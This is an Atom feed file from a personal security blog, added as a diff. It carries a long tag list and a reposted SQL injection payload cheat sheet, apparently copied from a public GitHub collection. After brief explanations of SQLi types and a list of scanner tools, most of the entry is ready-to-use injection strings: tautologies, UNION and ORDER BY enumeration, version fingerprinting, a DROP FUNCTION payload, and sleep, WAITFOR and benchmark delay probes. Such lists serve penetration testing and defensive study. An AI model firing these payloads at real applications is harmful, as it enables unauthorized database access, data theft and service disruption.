@@ -1,0 +1,1341 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://Or0kit.github.io</id>
+    <title>Or0kit • Posts by &#34;payload&#34; tag</title>
+    <link href="https://Or0kit.github.io" />
+    <updated>2020-12-30T09:38:30.000Z</updated>
+    <category term="Drozer" />
+    <category term="Algolia" />
+    <category term="同义词替换" />
+    <category term="xpath" />
+    <category term="win32api" />
+    <category term="WOW64" />
+    <category term="windows消息机制" />
+    <category term="虚拟内存" />
+    <category term="jsDelivr" />
+    <category term="First blog" />
+    <category term="markdown 学习" />
+    <category term="Android" />
+    <category term="替换密钥" />
+    <category term="数论基础" />
+    <category term="ADB" />
+    <category term="雷电模拟器" />
+    <category term="Hadoop" />
+    <category term="IDA" />
+    <category term="Windows逆向" />
+    <category term="SSH隧道" />
+    <category term="url" />
+    <category term="http" />
+    <category term="Nginx" />
+    <category term="Linux" />
+    <category term="CentOS7配置vsftp" />
+    <category term="Psad" />
+    <category term="fwsnort" />
+    <category term="应急响应" />
+    <category term="x86汇编指令" />
+    <category term="逆向" />
+    <category term="IDA学习" />
+    <category term="恶意代码分析实战入门" />
+    <category term="静态分析基础" />
+    <category term="动态分析技术基础" />
+    <category term="加壳" />
+    <category term="脱壳" />
+    <category term="C++壳" />
+    <category term="ESP寻址" />
+    <category term="定位Win32窗口回调函数" />
+    <category term="HOOK攻防" />
+    <category term="瞬时HOOK过检测" />
+    <category term="INLINE-HOOK" />
+    <category term="IAT HOOK" />
+    <category term="INLINE HOOK" />
+    <category term="进程监控" />
+    <category term="模块隐藏" />
+    <category term="进程通信" />
+    <category term="tlhelp32.h" />
+    <category term="进程遍历" />
+    <category term="模块遍历" />
+    <category term="TEB" />
+    <category term="PEB" />
+    <category term="R3层断链" />
+    <category term="外挂原理" />
+    <category term="DLL注入之进程间通信" />
+    <category term="Win临界区" />
+    <category term="Win互斥体" />
+    <category term="内存映射文件" />
+    <category term="内存映射共享" />
+    <category term="写拷贝" />
+    <category term="Win事件" />
+    <category term="线程同步" />
+    <category term="Win子窗口控件" />
+    <category term="win32文件函数" />
+    <category term="代码注入" />
+    <category term="窗口程序" />
+    <category term="消息机制" />
+    <category term="消息类型" />
+    <category term="私有内存" />
+    <category term="共享内存" />
+    <category term="设备对象" />
+    <category term="DC设备上下文" />
+    <category term="图形对象" />
+    <category term="创建线程" />
+    <category term="线程控制" />
+    <category term="线程相关API" />
+    <category term="线程上下文" />
+    <category term="CONTEXT结构体" />
+    <category term="物理内存" />
+    <category term="Windows进程" />
+    <category term="句柄表" />
+    <category term="远程线程函数" />
+    <category term="远程线程" />
+    <category term="DLL注入" />
+    <category term="DLL注入相关函数" />
+    <category term="WinMain函数" />
+    <category term="调用约定" />
+    <category term="我的GetProcAddress" />
+    <category term="资源文件" />
+    <category term="消息断点" />
+    <category term="通用控件" />
+    <category term="WM_NOTIFY消息类型" />
+    <category term="MFC" />
+    <category term="PE查看器" />
+    <category term="PE课后作业" />
+    <category term="RVA与FOA" />
+    <category term="PE结构" />
+    <category term="DOS头属性说明" />
+    <category term="标准PE头属性说明" />
+    <category term="扩展PE头属性说明" />
+    <category term="节表属性说明" />
+    <category term="空白区添加代码" />
+    <category term="合并节" />
+    <category term="导入表" />
+    <category term="注入" />
+    <category term="导入表注入" />
+    <category term="导出表" />
+    <category term="新增节" />
+    <category term="移动NT头" />
+    <category term="扩大节" />
+    <category term="移动导出表" />
+    <category term="移动重定位表" />
+    <category term="重定位表" />
+    <category term="静态链接库" />
+    <category term="动态链接库" />
+    <category term="句柄" />
+    <category term="button" />
+    <category term="单选框" />
+    <category term="复选框件" />
+    <category term="Edit" />
+    <category term="Combo Box" />
+    <category term="Tab" />
+    <category term="ListCtrl" />
+    <category term="MFC的本质" />
+    <category term="MFC的层次结构图" />
+    <category term="手动创建一个MFC程序" />
+    <category term="MFC的初始化过程" />
+    <category term="MFC运行时类型识别" />
+    <category term="关键字static" />
+    <category term="关键字const" />
+    <category term="MFC动态创建" />
+    <category term="MFC消息映射" />
+    <category term="结构体AFX_MSGMAP_ENTRY" />
+    <category term="结构体AFX_MSGM" />
+    <category term="MFC的三大类消息" />
+    <category term="数据传输" />
+    <category term="ini文件的读写" />
+    <category term="python" />
+    <category term="SSH" />
+    <category term="python文件读取" />
+    <category term="数据分析" />
+    <category term="socket" />
+    <category term="数据库编程" />
+    <category term="python内置属性" />
+    <category term="multiprocessing" />
+    <category term="threading" />
+    <category term="scrapy" />
+    <category term="测试" />
+    <category term="BHP" />
+    <category term="Python的import功能" />
+    <category term="木马" />
+    <category term="STL" />
+    <category term="Vector容器" />
+    <category term="Deque容器" />
+    <category term="List容器" />
+    <category term="Set容器" />
+    <category term="Multiset容器" />
+    <category term="Map容器" />
+    <category term="Multimap容器" />
+    <category term="Stack容器" />
+    <category term="Queue容器" />
+    <category term="STL算法" />
+    <category term="STL迭代器" />
+    <category term="CobaltStrike" />
+    <category term="RedTeam" />
+    <category term="Apeache" />
+    <category term="Nmap" />
+    <category term="php" />
+    <category term="guestbook" />
+    <category term="SQLmap" />
+    <category term="apache" />
+    <category term="log" />
+    <category term="mysql主键" />
+    <category term="CSRF" />
+    <category term="SSRF" />
+    <category term="业务逻辑漏洞" />
+    <category term="xss" />
+    <category term="webshell流量特征" />
+    <category term="虚拟网卡" />
+    <category term="0环与3环的通信（常规方法）" />
+    <category term="内核空间" />
+    <category term="内核模块" />
+    <category term="遍历内核模块" />
+    <category term="定位未导出函数PspTiminateProcess" />
+    <category term="内核编程基础" />
+    <category term="ANSI_STRING" />
+    <category term="UNICODE_STRING" />
+    <category term="内核内存" />
+    <category term="上下文环境" />
+    <category term="中断请求级别" />
+    <category term="链表" />
+    <category term="自旋锁" />
+    <category term="注册表" />
+    <category term="地址空间" />
+    <category term="文件操作" />
+    <category term="线程与事件" />
+    <category term="内核重载" />
+    <category term="驱动调试" />
+    <category term="配置VS2019+WDK10" />
+    <category term="第一个驱动程序" />
+    <category term="调试驱动程序" />
+    <category term="OpenSCManager" />
+    <category term="CreateService" />
+    <category term="APC的本质" />
+    <category term="APC的备用队列" />
+    <category term="消息队列" />
+    <category term="PsConvertToGuiThread" />
+    <category term="win32k.sys" />
+    <category term="GUI线程" />
+    <category term="窗口程序的创建" />
+    <category term="消息循环" />
+    <category term="线性地址的管理" />
+    <category term="VAD树" />
+    <category term="_MMVAD" />
+    <category term="_MMVAD_FLAGS" />
+    <category term="VirtualAlloc" />
+    <category term="MEM_COMMIT与MEM_RESERVE" />
+    <category term="malloc" />
+    <category term="堆内存" />
+    <category term="栈内存" />
+    <category term="全局区内存" />
+    <category term="共享物理页" />
+    <category term="共享文件" />
+    <category term="LoadLibrary的本质" />
+    <category term="MmAddPhysicalMemoryEx" />
+    <category term="缺页异常" />
+    <category term="临界区" />
+    <category term="KPCR结构体" />
+    <category term="等待链表" />
+    <category term="调度链表" />
+    <category term="模拟线程切换" />
+    <category term="模拟挂起与恢复函数" />
+    <category term="进程的创建" />
+    <category term="获取当前进程" />
+    <category term="ETHREAD" />
+    <category term="KTHREAD" />
+    <category term="EPROCESS" />
+    <category term="KPROCESS" />
+    <category term="2-9-9-12分页" />
+    <category term="PAE" />
+    <category term="PDPTE" />
+    <category term="PDE" />
+    <category term="PTE" />
+    <category term="XD标志位" />
+    <category term="逆向分析MmIsAddressValid函数(2-9-9-12)" />
+    <category term="PWT" />
+    <category term="PDT" />
+    <category term="TLB" />
+    <category term="CPU缓存" />
+    <category term="INVLPG指令" />
+    <category term="全局页" />
+    <category term="ShadowWalker" />
+    <category term="中断" />
+    <category term="异常" />
+    <category term="CLI指令" />
+    <category term="STI指令" />
+    <category term="INT2" />
+    <category term="INT8" />
+    <category term="中断门描述符" />
+    <category term="IDT" />
+    <category term="提权" />
+    <category term="TSS" />
+    <category term="跨段跳转流程" />
+    <category term="JMP FAR指令" />
+    <category term="任务门" />
+    <category term="LDT段描述符" />
+    <category term="LDT" />
+    <category term="CR0" />
+    <category term="CR2" />
+    <category term="CR4" />
+    <category term="CRL" />
+    <category term="DPL" />
+    <category term="RPL" />
+    <category term="段寄存器结构" />
+    <category term="段描述符" />
+    <category term="段选择子" />
+    <category term="GDT表" />
+    <category term="调用门" />
+    <category term="调用门描述符" />
+    <category term="逆向分析MmIsAddressValid函数" />
+    <category term="error C2143" />
+    <category term="error C2275" />
+    <category term="CALL与CALL FAR" />
+    <category term="陷阱门描述符" />
+    <category term="页目录表基址" />
+    <category term="页表的基址" />
+    <category term="0地址执行ShellCode" />
+    <category term="10-10-12分页" />
+    <category term="PDE_PTE" />
+    <category term="物理页" />
+    <category term="SSDT HOOK" />
+    <category term="OpenProcess" />
+    <category term="系统服务表" />
+    <category term="SSDT" />
+    <category term="SSDT HOOK隐藏" />
+    <category term="API进出内核" />
+    <category term="系统调用阶段总结" />
+    <category term="网络安全法" />
+    <category term="ASCII" />
+    <category term="GBK" />
+    <category term="ANSI" />
+    <category term="Unicode" />
+    <category term="UTF-8" />
+    <category term="URL 编码/解码" />
+    <category term="十进制" />
+    <category term="二进制" />
+    <category term="十六进制" />
+    <category term="内存" />
+    <category term="编写ShellCode实现IAT HOOK" />
+    <category term="ShellCode原则" />
+    <category term="傀儡进程加密壳" />
+    <category term="ZwUnmapViewOfSection函数" />
+    <category term="加载图标" />
+    <category term="提取图标" />
+    <category term="资源表" />
+    <category term="MFC命令传递" />
+    <category term="远控界面编写" />
+    <category term="HTML" />
+    <category term="文件包含" />
+    <category term="sql注入" />
+    <category term="经典定长指令" />
+    <category term="经典变长指令" />
+    <category term="指令前缀" />
+    <category term="进程句柄表" />
+    <category term="全局句柄表" />
+    <category term="KAPC" />
+    <category term="QueueUserAPC" />
+    <category term="NtQueueApcThread" />
+    <category term="KeInitializeApc" />
+    <category term="KeInsertQueueApc" />
+    <category term="KiInsertQueueApc" />
+    <category term="消息队列与线程" />
+    <category term="Windows线程切换" />
+    <category term="KiSwapContext" />
+    <category term="SwapContext" />
+    <category term="时钟中断" />
+    <category term="时间片管理" />
+    <category term="线程切换与TSS" />
+    <category term="线程切换与FS" />
+    <category term="线程切换与线程优先级" />
+    <category term="快速调用" />
+    <category term="中断调用" />
+    <category term="分析ReadProcessMemory" />
+    <category term="KiFastSystemCall" />
+    <category term="KiIntSystemCall" />
+    <category term="重写3环" />
+    <category term="文件上传" />
+    <category term="隐藏驱动" />
+    <category term="IopLoadDriver" />
+    <category term="延迟过程调用" />
+    <category term="进程挂靠" />
+    <category term="跨进程读写内存" />
+    <category term="APC" />
+    <category term="逆向分析NtReadVirtualMemory" />
+    <category term="逆向分析NtWriteVIrtualMemory" />
+    <category term="AD-Attack-Defense" />
+    <category term="payload" />
+    <category term="sysenter指令" />
+    <category term="KiFastCallEntry函数" />
+    <category term="KiSystemService函数" />
+    <category term="Trap_Frame" />
+    <category term="web安全" />
+    <category term="Pentest" />
+    <entry>
+        <id>https://or0kit.github.io/PenetrationTest/Web-Security/SQL-injection-payload-list/</id>
+        <title>SQL-injection-payload-list【转】</title>
+        <link rel="alternate" href="https://or0kit.github.io/PenetrationTest/Web-Security/SQL-injection-payload-list/"/>
+        <content type="html">&lt;h1 id=&#34;sql-injection-payload-list&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-injection-payload-list&#34;&gt;#&lt;/a&gt; SQL Injection Payload List&lt;/h1&gt;
+&lt;p&gt;源地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gvc3FsLWluamVjdGlvbi1wYXlsb2FkLWxpc3Q=&#34;&gt;https://github.com/payloadbox/sql-injection-payload-list&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;sql-injection&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-injection&#34;&gt;#&lt;/a&gt; SQL Injection&lt;/h2&gt;
+&lt;p&gt;In this section, we&#39;ll explain what SQL injection is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.&lt;/p&gt;
+&lt;h2 id=&#34;what-is-sql-injection-sqli&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#what-is-sql-injection-sqli&#34;&gt;#&lt;/a&gt; What is SQL injection (SQLi)?&lt;/h2&gt;
+&lt;p&gt;SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application&#39;s content or behavior.&lt;/p&gt;
+&lt;p&gt;In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;SQL Injection Type&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;In-band SQLi (Classic SQLi)&lt;/td&gt;
+&lt;td&gt;In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. The two most common types of in-band SQL Injection are Error-based SQLi and Union-based SQLi.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Error-based SQLi&lt;/td&gt;
+&lt;td&gt;Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Union-based SQLi&lt;/td&gt;
+&lt;td&gt;Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Inferential SQLi (Blind SQLi)&lt;/td&gt;
+&lt;td&gt;Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application’s response and the resulting behavior of the database server. The two types of inferential SQL Injection are Blind-boolean-based SQLi and Blind-time-based SQLi.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Boolean-based (content-based) Blind SQLi&lt;/td&gt;
+&lt;td&gt;Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Time-based Blind SQLi&lt;/td&gt;
+&lt;td&gt;Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. epending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Out-of-band SQLi&lt;/td&gt;
+&lt;td&gt;Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable).&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Voice Based Sql Injection&lt;/td&gt;
+&lt;td&gt;It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;sql-injection-vulnerability-scanner-tools&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-injection-vulnerability-scanner-tools&#34;&gt;#&lt;/a&gt; SQL Injection Vulnerability Scanner Tool&#39;s :&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw&#34;&gt;SQLMap&lt;/span&gt; – Automatic SQL Injection And Database Takeover Tool&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JvbjE5MC9qc3FsLWluamVjdGlvbg==&#34;&gt;jSQL Injection&lt;/span&gt; – Java Tool For Automatic SQL Database Injection&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL05lb2hhcHNpcy9iYnFzcWw=&#34;&gt;BBQSQL&lt;/span&gt; – A Blind SQL-Injection Exploitation Tool&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NvZGluZ28vTm9TUUxNYXA=&#34;&gt;NoSQLMap&lt;/span&gt; – Automated NoSQL Database Pwnage&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cua2l0cGxvaXQuY29tLzIwMTcvMDUvd2hpdGV3aWRvdy1zcWwtdnVsbmVyYWJpbGl0eS1zY2FubmVyLmh0bWw=&#34;&gt;Whitewidow&lt;/span&gt; – SQL Vulnerability Scanner&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3N0YW1wYXJtL0RTU1M=&#34;&gt;DSSS&lt;/span&gt; – Damn Small SQLi Scanner&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2R0YWctZGV2LXNlYy9leHBsbw==&#34;&gt;explo&lt;/span&gt; – Human And Machine Readable Web Vulnerability Testing Format&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2F3bnVtYXIvYmxpbmQtc3FsLWJpdHNoaWZ0aW5n&#34;&gt;Blind-Sql-Bitshifting&lt;/span&gt; – Blind SQL-Injection via Bitshifting&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xldmlhdGhhbi1mcmFtZXdvcmsvbGV2aWF0aGFu&#34;&gt;Leviathan&lt;/span&gt; – Wide Range Mass Audit Toolkit&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0pvaG5Ucm9vbnkvQmxpc3F5&#34;&gt;Blisqy&lt;/span&gt; – Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;generic-sql-injection-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generic-sql-injection-payloads&#34;&gt;#&lt;/a&gt; Generic SQL Injection Payloads&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;&#39;
+&#39;&#39;
+`
+``
+,
+&amp;quot;
+&amp;quot;&amp;quot;
+/
+//
+\
+\\
+;
+&#39; or &amp;quot;
+-- or # 
+&#39; OR &#39;1
+&#39; OR 1 -- -
+&amp;quot; OR &amp;quot;&amp;quot; = &amp;quot;
+&amp;quot; OR 1 = 1 -- -
+&#39; OR &#39;&#39; = &#39;
+&#39;=&#39;
+&#39;LIKE&#39;
+&#39;=0--+
+ OR 1=1
+&#39; OR &#39;x&#39;=&#39;x
+&#39; AND id IS NULL; --
+&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;UNION SELECT &#39;2
+%00
+/*…*/ 
++		addition, concatenate (or space in url)
+||		(double pipe) concatenate
+%		wildcard attribute indicator
+
+@variable	local variable
+@@variable	global variable
+
+
+# Numeric
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+1*56
+-2
+
+
+1&#39; ORDER BY 1--+
+1&#39; ORDER BY 2--+
+1&#39; ORDER BY 3--+
+
+1&#39; ORDER BY 1,2--+
+1&#39; ORDER BY 1,2,3--+
+
+1&#39; GROUP BY 1,2,--+
+1&#39; GROUP BY 1,2,3--+
+&#39; GROUP BY columnnames having 1=1 --
+
+
+-1&#39; UNION SELECT 1,2,3--+
+&#39; UNION SELECT sum(columnname ) from tablename --
+
+
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+
+1 AND (SELECT * FROM Users) = 1	
+
+&#39; AND MID(VERSION(),1,1) = &#39;5&#39;;
+
+&#39; and 1 in (select min(name) from sysobjects where xtype = &#39;U&#39; and name &amp;gt; &#39;.&#39;) --
+
+
+Finding the table name
+
+
+Time-Based:
+,(select * from (select(sleep(10)))a)
+%2c(select%20*%20from%20(select(sleep(10)))a)
+&#39;;WAITFOR DELAY &#39;0:0:30&#39;--
+
+Comments:
+
+#	    Hash comment
+/*  	C-style comment
+-- -	SQL comment
+;%00	Nullbyte
+`	    Backtick
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;generic-error-based-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generic-error-based-payloads&#34;&gt;#&lt;/a&gt; Generic Error Based Payloads&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt; OR 1=1
+ OR 1=0
+ OR x=x
+ OR x=y
+ OR 1=1#
+ OR 1=0#
+ OR x=x#
+ OR x=y#
+ OR 1=1-- 
+ OR 1=0-- 
+ OR x=x-- 
+ OR x=y-- 
+ OR 3409=3409 AND (&#39;pytW&#39; LIKE &#39;pytW
+ OR 3409=3409 AND (&#39;pytW&#39; LIKE &#39;pytY
+ HAVING 1=1
+ HAVING 1=0
+ HAVING 1=1#
+ HAVING 1=0#
+ HAVING 1=1-- 
+ HAVING 1=0-- 
+ AND 1=1
+ AND 1=0
+ AND 1=1-- 
+ AND 1=0-- 
+ AND 1=1#
+ AND 1=0#
+ AND 1=1 AND &#39;%&#39;=&#39;
+ AND 1=0 AND &#39;%&#39;=&#39;
+ AND 1083=1083 AND (1427=1427
+ AND 7506=9091 AND (5913=5913
+ AND 1083=1083 AND (&#39;1427=1427
+ AND 7506=9091 AND (&#39;5913=5913
+ AND 7300=7300 AND &#39;pKlZ&#39;=&#39;pKlZ
+ AND 7300=7300 AND &#39;pKlZ&#39;=&#39;pKlY
+ AND 7300=7300 AND (&#39;pKlZ&#39;=&#39;pKlZ
+ AND 7300=7300 AND (&#39;pKlZ&#39;=&#39;pKlY
+ AS INJECTX WHERE 1=1 AND 1=1
+ AS INJECTX WHERE 1=1 AND 1=0
+ AS INJECTX WHERE 1=1 AND 1=1#
+ AS INJECTX WHERE 1=1 AND 1=0#
+ AS INJECTX WHERE 1=1 AND 1=1--
+ AS INJECTX WHERE 1=1 AND 1=0--
+ WHERE 1=1 AND 1=1
+ WHERE 1=1 AND 1=0
+ WHERE 1=1 AND 1=1#
+ WHERE 1=1 AND 1=0#
+ WHERE 1=1 AND 1=1--
+ WHERE 1=1 AND 1=0--
+ ORDER BY 1-- 
+ ORDER BY 2-- 
+ ORDER BY 3-- 
+ ORDER BY 4-- 
+ ORDER BY 5-- 
+ ORDER BY 6-- 
+ ORDER BY 7-- 
+ ORDER BY 8-- 
+ ORDER BY 9-- 
+ ORDER BY 10-- 
+ ORDER BY 11-- 
+ ORDER BY 12-- 
+ ORDER BY 13-- 
+ ORDER BY 14-- 
+ ORDER BY 15-- 
+ ORDER BY 16-- 
+ ORDER BY 17-- 
+ ORDER BY 18-- 
+ ORDER BY 19-- 
+ ORDER BY 20-- 
+ ORDER BY 21-- 
+ ORDER BY 22-- 
+ ORDER BY 23-- 
+ ORDER BY 24-- 
+ ORDER BY 25-- 
+ ORDER BY 26-- 
+ ORDER BY 27-- 
+ ORDER BY 28-- 
+ ORDER BY 29-- 
+ ORDER BY 30-- 
+ ORDER BY 31337-- 
+ ORDER BY 1# 
+ ORDER BY 2# 
+ ORDER BY 3# 
+ ORDER BY 4# 
+ ORDER BY 5# 
+ ORDER BY 6# 
+ ORDER BY 7# 
+ ORDER BY 8# 
+ ORDER BY 9# 
+ ORDER BY 10# 
+ ORDER BY 11# 
+ ORDER BY 12# 
+ ORDER BY 13# 
+ ORDER BY 14# 
+ ORDER BY 15# 
+ ORDER BY 16# 
+ ORDER BY 17# 
+ ORDER BY 18# 
+ ORDER BY 19# 
+ ORDER BY 20# 
+ ORDER BY 21# 
+ ORDER BY 22# 
+ ORDER BY 23# 
+ ORDER BY 24# 
+ ORDER BY 25# 
+ ORDER BY 26# 
+ ORDER BY 27# 
+ ORDER BY 28# 
+ ORDER BY 29# 
+ ORDER BY 30#
+ ORDER BY 31337#
+ ORDER BY 1 
+ ORDER BY 2 
+ ORDER BY 3 
+ ORDER BY 4 
+ ORDER BY 5 
+ ORDER BY 6 
+ ORDER BY 7 
+ ORDER BY 8 
+ ORDER BY 9 
+ ORDER BY 10 
+ ORDER BY 11 
+ ORDER BY 12 
+ ORDER BY 13 
+ ORDER BY 14 
+ ORDER BY 15 
+ ORDER BY 16 
+ ORDER BY 17 
+ ORDER BY 18 
+ ORDER BY 19 
+ ORDER BY 20 
+ ORDER BY 21 
+ ORDER BY 22 
+ ORDER BY 23 
+ ORDER BY 24 
+ ORDER BY 25 
+ ORDER BY 26 
+ ORDER BY 27 
+ ORDER BY 28 
+ ORDER BY 29 
+ ORDER BY 30 
+ ORDER BY 31337 
+ RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND &#39;Txws&#39;=&#39;
+ RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND &#39;Txws&#39;=&#39;
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+%&#39; AND 8310=8310 AND &#39;%&#39;=&#39;
+%&#39; AND 8310=8311 AND &#39;%&#39;=&#39;
+ and (select substring(@@version,1,1))=&#39;X&#39;
+ and (select substring(@@version,1,1))=&#39;M&#39;
+ and (select substring(@@version,2,1))=&#39;i&#39;
+ and (select substring(@@version,2,1))=&#39;y&#39;
+ and (select substring(@@version,3,1))=&#39;c&#39;
+ and (select substring(@@version,3,1))=&#39;S&#39;
+ and (select substring(@@version,3,1))=&#39;X&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;generic-time-based-sql-injection-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generic-time-based-sql-injection-payloads&#34;&gt;#&lt;/a&gt; Generic Time Based SQL Injection Payloads&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;# from wapiti
+sleep(5)#
+1 or sleep(5)#
+&amp;quot; or sleep(5)#
+&#39; or sleep(5)#
+&amp;quot; or sleep(5)=&amp;quot;
+&#39; or sleep(5)=&#39;
+1) or sleep(5)#
+&amp;quot;) or sleep(5)=&amp;quot;
+&#39;) or sleep(5)=&#39;
+1)) or sleep(5)#
+&amp;quot;)) or sleep(5)=&amp;quot;
+&#39;)) or sleep(5)=&#39;
+;waitfor delay &#39;0:0:5&#39;--
+);waitfor delay &#39;0:0:5&#39;--
+&#39;;waitfor delay &#39;0:0:5&#39;--
+&amp;quot;;waitfor delay &#39;0:0:5&#39;--
+&#39;);waitfor delay &#39;0:0:5&#39;--
+&amp;quot;);waitfor delay &#39;0:0:5&#39;--
+));waitfor delay &#39;0:0:5&#39;--
+&#39;));waitfor delay &#39;0:0:5&#39;--
+&amp;quot;));waitfor delay &#39;0:0:5&#39;--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+&amp;quot; or benchmark(10000000,MD5(1))#
+&#39; or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+&amp;quot;) or benchmark(10000000,MD5(1))#
+&#39;) or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+&amp;quot;)) or benchmark(10000000,MD5(1))#
+&#39;)) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+&amp;quot; or pg_sleep(5)--
+&#39; or pg_sleep(5)--
+1) or pg_sleep(5)--
+&amp;quot;) or pg_sleep(5)--
+&#39;) or pg_sleep(5)--
+1)) or pg_sleep(5)--
+&amp;quot;)) or pg_sleep(5)--
+&#39;)) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND &#39;vRxe&#39;=&#39;vRxe
